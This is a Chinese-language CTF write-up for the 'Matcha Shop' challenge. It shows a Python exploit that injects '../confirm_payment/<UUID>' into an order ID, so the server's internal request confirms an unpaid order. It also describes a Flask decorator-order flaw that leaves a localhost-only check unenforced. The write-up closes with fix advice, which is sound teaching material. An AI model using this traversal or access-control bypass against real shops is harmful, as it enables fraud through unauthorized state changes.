# Matcha Shop

## 题目简述

订单创建后状态为 `pending`，只有 `paid` 订单的确认页才显示 flag。应用提供两个后端接口，其中确认付款接口本应仅允许本机访问；官方预期利用是把可控订单 ID 拼进服务端 URL，通过 `..` 路径归一化让前端代为调用确认接口。

## 解题过程

先提交任意合法订单，从确认页隐藏字段取得 UUID。保存编辑时，前端服务会执行：

```python
requests.post(
    f"http://127.0.0.1:8000/backend/edit_order/{order_id}",
    json={...},
)
```

把 `order_id` 改为 `../confirm_payment/<真实 UUID>` 后，请求库归一化路径，实际访问 `/backend/confirm_payment/<UUID>`，数据库状态变为 `paid`。最小复现为：

```python
import re
import requests

order = {
    "item_name": "Matcha Strawberry",
    "sweetness": "50%",
    "milk_type": "Whole Milk",
    "ice_level": "Normal Ice",
}

created = requests.post(base_url + "/submit_order", data=order)
order_id = re.search(
    r'name="order_id" value="([^"]+)"', created.text
).group(1)

result = requests.post(
    base_url + "/edit",
    data={
        **order,
        "save": "1",
        "order_id": f"../confirm_payment/{order_id}",
    },
)
print(result.text)
```

源码还存在一条更短的非预期路径。两个后端函数的装饰器顺序是：

```python
@localhost_only
@app.route("/backend/confirm_payment/<order_id>", methods=["POST"])
def backend_confirm_payment(order_id):
    ...
```

Python 从下向上应用装饰器：`app.route` 先把原函数注册进 Flask，`localhost_only` 只包装之后赋回模块名的对象，已注册视图仍是未包装函数。因此外部客户端可以直接 POST `/backend/confirm_payment/<UUID>`，再访问确认页获取 flag。本地 test client 把 `REMOTE_ADDR` 显式设为 `203.0.113.5` 时仍返回 200，验证了该绕过；官方的路径归一化链也已在多线程本地服务上成功执行。两种路径最终都得到 `grey{I_L0v3_fr33_M4Tch4}`。

## 方法总结

本题预期考查服务器端自请求中的路径拼接与 `..` 归一化，但真实源码还因装饰器顺序错误彻底失去本机访问控制。审计 Flask 装饰器时要确认被注册的是包装前还是包装后的函数；修复方式是把 `@app.route` 放在最外层，并对内部请求使用不可由用户控制的结构化路由参数。最终 flag 为 `grey{I_L0v3_fr33_M4Tch4}`。
